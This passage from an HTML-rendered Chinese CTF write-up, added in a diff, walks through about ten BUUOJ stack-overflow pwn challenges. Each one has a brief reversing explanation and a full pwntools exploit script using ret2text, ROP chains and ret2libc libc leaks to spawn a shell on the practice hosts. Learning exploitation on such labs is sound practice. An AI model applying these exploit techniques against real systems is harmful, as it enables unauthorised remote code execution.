+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Hello,&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">leak</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="Snipaste_2025-04-10_22-06-46" src="Snipaste_2025-04-10_22-06-46.png" /></p>
+<p><img alt="image-20250410220655029" src="image-20250410220655029.png" /></p>
+<h2 id="8_jarvisoj_level2">题目8_jarvisoj_level2</h2>
+<ul>
+<li>
+<p>考点：<code>ret2text</code>、<code>32位rop链</code></p>
+</li>
+<li>
+<p>先检查一下保护机制</p>
+</li>
+</ul>
+<p><img alt="image-20250410220759993" src="image-20250410220759993.png" /></p>
+<ul>
+<li>开始逆向程序，先查看<code>main</code>函数，发现有<code>system</code>函数，并且有一个<code>vulnerable_function()</code>函数</li>
+</ul>
+<p><img alt="image-20250410220843212" src="image-20250410220843212.png" /></p>
+<ul>
+<li>查看<code>vulnerable_function()</code>函数，发现存在栈溢出</li>
+</ul>
+<p><img alt="image-20250410221124299" src="image-20250410221124299.png" /></p>
+<ul>
+<li>这时翻找字符串，发现还存在<code>/bin/sh</code>字符串，这样我们通过栈溢出就可以执行<code>system("/bin/sh")</code></li>
+</ul>
+<p><img alt="image-20250410221219523" src="image-20250410221219523.png" /></p>
+<ul>
+<li>这时直接构造<code>32位rop链</code>，注意返回到<code>call System</code>和返回到<code>system</code>的<code>plt</code>表布置栈还稍微有点区别，主要就是返回到<code>system</code>的<code>plt</code>还要填充一个<code>p32(0xdeadbeff)</code>作为返回地址，然后再写入<code>sh_addr</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./level2&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">29574</span><span class="p">)</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="mh">0x804A024</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="mh">0x804845C</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410222315099" src="image-20250410222315099.png" /></p>
+<p><img alt="image-20250410222328497" src="image-20250410222328497.png" /></p>
+<h2 id="9_ciscn_2019_n_8">题目9_ciscn_2019_n_8</h2>
+<ul>
+<li>考点：<code>溢出漏洞</code></li>
+<li>先查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250410222644643" src="image-20250410222644643.png" /></p>
+<ul>
+<li>逆向分析程序，发现简单的栈溢出操作。</li>
+</ul>
+<p><img alt="image-20250410222734581" src="image-20250410222734581.png" /></p>
+<ul>
+<li>确认偏移即可，再输入<code>17</code>即可<code>getshell</code></li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ciscn_2019_n_8&#39;</span><span class="p">)</span>
+<span class="c1">#p = remote(&#39;node5.buuoj.cn&#39;,29574)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">17</span><span class="p">)</span>
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+<span class="n">pause</span><span class="p">()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410224112619" src="image-20250410224112619.png" /></p>
+<p><img alt="image-20250410224117710" src="image-20250410224117710.png" /></p>
+<h2 id="10_bjdctf_2020_babystack">题目10_bjdctf_2020_babystack</h2>
+<ul>
+<li>考点：<code>ret2text</code></li>
+<li>先查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250410225343705" src="image-20250410225343705.png" /></p>
+<ul>
+<li>逆向这个程序，发现我们可以指定输入的字节数，这时我们就可以进行溢出</li>
+</ul>
+<p><img alt="image-20250410225401080" src="image-20250410225401080.png" /></p>
+<ul>
+<li>现在查看栈上布局，发现我们在溢出的时候会修改我们输入的字节数</li>
+</ul>
+<p><img alt="image-20250410225440602" src="image-20250410225440602.png" /></p>
+<ul>
+<li>这个时候我们就要注意溢出的内容，否则可能会出现溢出完<code>nbytes</code>就不能再溢出的问题。</li>
+<li>
+<p>还需要注意栈对齐的问题</p>
+</li>
+<li>
+<p>exp如下：</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./bjdctf_2020_babystack&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26437</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;50&#39;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006FA</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4006E6</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250410230005911" src="image-20250410230005911.png" /></p>
+<p><img alt="image-20250410230011838" src="image-20250410230011838.png" /></p>
+<h2 id="11_ciscn_2019_c_1">题目11_ciscn_2019_c_1</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>ret2libc</code></li>
+<li>先来查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250411172343532" src="image-20250411172343532.png" /></p>
+<ul>
+<li>然后直接开始逆向这个程序，查看<code>main</code>函数。发现主要就是一个加密的选项</li>
+</ul>
+<p><img alt="image-20250411172423378" src="image-20250411172423378.png" /></p>
+<ul>
+<li>查看<code>begin()</code>函数程序中只实现了，选项<code>1</code>，并且解密选项没有实现。</li>
+</ul>
+<p><img alt="image-20250411172503696" src="image-20250411172503696.png" /></p>
+<ul>
+<li>接下来我们就查看这个<code>Encrypt()</code>函数，发现这个函数会有一个<code>gets()</code>函数，存在栈溢出。</li>
+<li>并且再输入完程序内容时，会对输入的内容进行异或加密</li>
+</ul>
+<p><img alt="image-20250411172651257" src="image-20250411172651257.png" /></p>
+<ul>
+<li>这时我们构造<code>rop</code>链的时候就需要输入异或之后的内容。然后发现这个程序并没有现成的<code>shell</code>函数。</li>
+<li>或者还有一种办法就是使用<code>\x00</code>进行截断，这样<code>rop</code>链就不会被加密。本题使用这种打法。</li>
+<li>此时我们就需要打<code>ret2libc</code></li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="c1">#p = process(&#39;./ciscn_2019_c_1&#39;)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25616</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400c83</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4006b9</span>
+<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x4006E0</span>
+<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x602020</span>
+<span class="n">encrypt</span> <span class="o">=</span> <span class="mh">0x4009A0</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">encrypt</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;l</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">leak</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">leak</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x1</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x50</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x8</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="c1">#p.sendline(payload)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411175703431" src="image-20250411175703431.png" /></p>
+<h2 id="12_jarvisoj_level2_x64">题目12_jarvisoj_level2_x64</h2>
+<ul>
+<li>考点：<code>ret2text</code>、<code>简单64位rop链</code></li>
+<li>先查看一下检查机制</li>
+</ul>
+<p><img alt="image-20250411175955565" src="image-20250411175955565.png" /></p>
+<ul>
+<li>直接逆向程序，查看<code>main</code>函数，只调用了这个函数，发现有<code>system()</code></li>
+</ul>
+<p><img alt="image-20250411180016486" src="image-20250411180016486.png" /></p>
+<ul>
+<li>查看<code>vulnerable_function()</code>函数，发现存在栈溢出</li>
+</ul>
+<p><img alt="image-20250411180115063" src="image-20250411180115063.png" /></p>
+<ul>
+<li>并且发现有<code>/bin/sh</code></li>
+</ul>
+<p><img alt="image-20250411180139032" src="image-20250411180139032.png" /></p>
+<ul>
+<li>简单<code>rop</code>链构造即可，exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level2_x64&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25772</span><span class="p">)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4006b3</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="mh">0x600A90</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="mh">0x40063E</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x88</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="Snipaste_2025-04-11_18-05-50" src="Snipaste_2025-04-11_18-05-50.png" /></p>
+<h2 id="13_get_started_3dsctf_2016">题目13_get_started_3dsctf_2016</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>32位参数调用</code>、<code>全缓冲输出</code>、<code>静态编译</code></li>
+<li>先查看保护机制，发现是一个<code>32</code>位程序</li>
+</ul>
+<p><img alt="image-20250411182039835" src="image-20250411182039835.png" /></p>
+<ul>
+<li>逆向程序，查看<code>main</code>函数，发现<code>main</code>函数存在栈溢出</li>
+</ul>
+<p><img alt="image-20250411193927735" src="image-20250411193927735.png" /></p>
+<ul>
+<li>并且我们查看函数会发现，有一个<code>get_flag</code>的函数，当函数满足条件的时候就会<code>get flag</code></li>
+</ul>
+<p><img alt="image-20250411194008791" src="image-20250411194008791.png" /></p>
+<ul>
+<li>思路就是直接栈溢出修改参数，然后返回到<code>get flag</code>这个函数中</li>
+<li>在打的过程中需要注意，<code>32</code>位参数传递是从右向左依次传入栈中，所以第一个参数在最低栈地址中。</li>
+<li>还要注意一点就是，这题并没有开启<code>无缓冲输出</code>，所以在调用完<code>get flag</code>函数时，我们需要返回到<code>main</code>函数，再进行栈溢出，调用<code>fflush(0)</code>，刷新缓冲区。</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./get_started_3dsctf_2016&#39;)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">28601</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x080489A0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048A20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x308CD64F</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x195719D1</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x804F3E0</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span>  <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411200020527" src="image-20250411200020527.png" /></p>
+<h2 id="14_harekazectf2019baby_rop">题目14_[HarekazeCTF2019]baby_rop</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>64位简单rop链</code></li>
+<li>检查一下保护机制</li>
+</ul>
+<p><img alt="image-20250411200645736" src="image-20250411200645736.png" /></p>
+<ul>
+<li>直接逆向程序，查看<code>main</code>函数，发现有<code>system()</code>函数和一个栈溢出操作</li>
+</ul>
+<p><img alt="image-20250411200619359" src="image-20250411200619359.png" /></p>
+<ul>
+<li>然后还发现了<code>/bin/sh\x00</code>这个字符串</li>
+</ul>
+<p><img alt="image-20250411200713637" src="image-20250411200713637.png" /></p>
+<ul>
+<li>直接栈溢出构造<code>rop</code>链</li>
+<li>exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="c1">#p = process(&#39;./babyrop&#39;)</span>
+<span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400683</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27158</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x10</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x601048</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4005E3</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411201153272" src="image-20250411201153272.png" /></p>
+<h2 id="15_others_shellcode">题目15_others_shellcode</h2>
+<ul>
+<li>考点：初步了解<code>32位程序的系统调用</code></li>
+<li>先查看一下保护机制</li>
+</ul>
+<p><img alt="image-20250411201435478" src="image-20250411201435478.png" /></p>
+<ul>
+<li>先逆向程序，查看一下<code>main</code>函数</li>
+</ul>
+<p><img alt="image-20250411201501033" src="image-20250411201501033.png" /></p>
+<ul>
+<li>再查看一下<code>getShell()</code>，发现<code>eax = 11</code>、<code>v1="/bin/sh\x00"</code>，然后进行<code>int 0x80</code>进行系统调用</li>
+</ul>
+<p><img alt="image-20250411201519745" src="image-20250411201519745.png" /></p>
+<ul>
+<li>本题就是了解一下系统调用，nc即可<code>getshell</code>,故本题无<code>exp</code></li>
+</ul>
+<p><img alt="image-20250411201639828" src="image-20250411201639828.png" /></p>
+<h2 id="16_ogeek2019babyrop">题目16_[OGeek2019]babyrop</h2>
+<ul>
+<li>考点：<code>伪随机数</code>、<code>栈溢出</code>、<code>32位rop链</code>、<code>ret2libc</code>、<code>\x00截断</code></li>
+<li>检查一下程序的保护机制</li>
+</ul>
+<p><img alt="image-20250411203432889" src="image-20250411203432889.png" /></p>
+<ul>
+<li>逆向程序，先查看一下<code>main</code>函数，发现有一个随机数</li>
+</ul>
+<p><img alt="image-20250411203448850" src="image-20250411203448850.png" /></p>
+<ul>
+<li>再查看一下<code>sub_804871F()</code>这个函数，发现程序会将用户输入的内容与随机数进行比较，比较长度为用户输入的内容的长度</li>
+</ul>
+<p><img alt="image-20250411203603651" src="image-20250411203603651.png" /></p>
+<ul>
+<li>如果比较成功就会返回<code>buf[7]</code>，并且<code>buf[7]</code>可以控制<code>sub_80487D0</code>这个函数，这样就会导致栈溢出。</li>
+</ul>
+<p><img alt="image-20250411203720722" src="image-20250411203720722.png" /></p>
+<ul>
+<li>所以我们先使用<code>\x00</code>对程序进行截断操作，然后再向<code>but[7]</code>输入一个数，能造成溢出。（这样stcncmp就不会进行判断，直接返回0）就可以直接进入<code>下一个栈溢出函数</code></li>
+<li>最后就直接栈溢出，exp如下：</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.23.so&#39;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node5.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">25643</span><span class="p">)</span>
+<span class="c1">#p = process(&#39;./pwn&#39;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x1E</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xE7</span> <span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8048548</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x8048825</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x8049FD4</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Correct</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;leak---&gt;&#39;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
+<span class="n">puts_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">,</span><span class="s1">&#39;little&#39;</span><span class="p">)</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
+<span class="n">sys_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<span class="n">sh_addr</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">+</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x1E</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="c1">#pause()</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0xE7</span> <span class="o">+</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p><img alt="image-20250411212930743" src="image-20250411212930743.png" /></p>
+<h2 id="17_ciscn_2019_n_5">题目17_ciscn_2019_n_5</h2>
+<ul>
+<li>考点：<code>栈溢出</code>、<code>ret2libc</code>、<code>向bss段写入/bin/sh</code></li>
+<li>保护机制</li>
+</ul>
+<p><img alt="image-20250411225244111" src="image-20250411225244111.png" /></p>
+<ul>
